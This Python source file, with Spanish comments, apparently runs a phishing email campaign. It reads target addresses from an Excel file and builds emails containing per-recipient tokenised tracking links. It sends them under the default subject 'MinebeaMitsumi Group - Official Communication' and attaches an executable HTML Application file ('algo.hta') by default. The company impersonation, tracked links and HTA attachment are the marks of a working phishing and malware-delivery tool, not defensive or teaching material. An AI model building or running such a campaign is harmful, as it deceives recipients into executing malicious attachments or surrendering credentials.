import os
import sys
import logging
from pathlib import Path
from typing import Optional
from dotenv import load_dotenv

from .excel_reader import ExcelReader
from .token_generator import TokenGenerator
from .mjml_generator import MJMLEmailGenerator
from .email_sender import EmailSender

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join('logs', 'mail_sender.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Cargar variables de entorno
load_dotenv()

class MailCampaign:    
    def __init__(self, base_url: Optional[str] = None):
        self.smtp_server = os.getenv("SMTP_SERVER", "smtp.gmail.com")
        self.smtp_port = int(os.getenv("SMTP_PORT", "587"))
        self.sender_email = os.getenv("SENDER_EMAIL")
        self.sender_password = os.getenv("SENDER_PASSWORD")
        self.base_url = base_url or os.getenv("BASE_URL")
        self.excel_file = os.getenv("EXCEL_FILE", os.path.join("data", "destinatarios.xlsx"))
        self.excel_column = os.getenv("EXCEL_COLUMN", "email")
        self.secret_key = os.getenv("SECRET_KEY", "tu_clave_secreta_muy_larga_y_aleatoria")
        self.attachment_file = os.getenv("ATTACHMENT_FILE", "algo.hta")
        
        self._validate_config()
    
    def _validate_config(self):
        missing = []
        
        if not self.sender_email:
            missing.append("SENDER_EMAIL")
        if not self.sender_password:
            missing.append("SENDER_PASSWORD")
        if not self.base_url:
            missing.append("BASE_URL")
        if not os.path.exists(self.excel_file):
            missing.append(f"Excel file not found: {self.excel_file}")
        
        if missing:
            logger.error(f"Configuración incompleta: {', '.join(missing)}")
            logger.error("Por favor, configura el archivo .env con los valores necesarios")
            sys.exit(1)
            
        if self.attachment_file and not os.path.exists(self.attachment_file):
            logger.warning(f"Archivo adjunto no encontrado: {self.attachment_file}")
    
    def generate_html_content(self, recipient_data: dict) -> str:
        email = recipient_data.get("email", "")
        
        # Generar token
        token_generator = TokenGenerator(self.secret_key)
        token, expiration = token_generator.generate_token(email)
        
        # Construir URL con token y email
        button_url = f"{self.base_url}/token/{token}?email={email}"
        
        logger.debug(f"Token generado para {email}: {token}")
        logger.debug(f"URL del botón: {button_url}")
        
        # Generar MJML
        mjml_content = MJMLEmailGenerator.create_mjml_template(button_url, email, self.base_url)
        
        # Compilar a HTML
        html_content = MJMLEmailGenerator.mjml_to_html(mjml_content)
        
        return html_content
    
    def run(self, subject: str = "MinebeaMitsumi Group - Official Communication"):
        logger.info("="*60)
        logger.info("INICIANDO CAMPAÑA DE ENVÍO DE CORREOS")
        logger.info("="*60)
        
        try:
            # 1. Leer emails del Excel
            logger.info(f"\n1. Leyendo destinatarios de: {self.excel_file}")
            recipients_data = ExcelReader.read_emails_with_data(
                self.excel_file,
                self.excel_column
            )
            
            if not recipients_data:
                logger.error("No se encontraron destinatarios")
                return
            
            # 2. Inicializar cliente de email
            logger.info(f"\n2. Conectando a SMTP: {self.smtp_server}:{self.smtp_port}")
            email_sender = EmailSender(
                self.smtp_server,
                self.smtp_port,
                self.sender_email,
                self.sender_password
            )
            
            # 3. Enviar correos
            logger.info(f"\n3. Enviando {len(recipients_data)} correos...\n")
            if self.attachment_file and os.path.exists(self.attachment_file):
                 logger.info(f"   Adjuntando archivo: {self.attachment_file}")
            
            stats = email_sender.send_batch_emails(
                recipients_data,
                subject,
                self.generate_html_content,
                attachment_path=self.attachment_file
            )
            
            # 4. Mostrar resumen
            logger.info(f"\n4. Resumen final:")
            logger.info(f"   Tasa de éxito: {stats['enviados']}/{stats['total']} "
                       f"({100*stats['enviados']//stats['total']}%)")
            
            return stats
            
        except Exception as e:
            logger.error(f"\nError en la campaña: {str(e)}", exc_info=True)
            sys.exit(1)

def main():
    campaign = MailCampaign()
    campaign.run()

if __name__ == "__main__":
    main()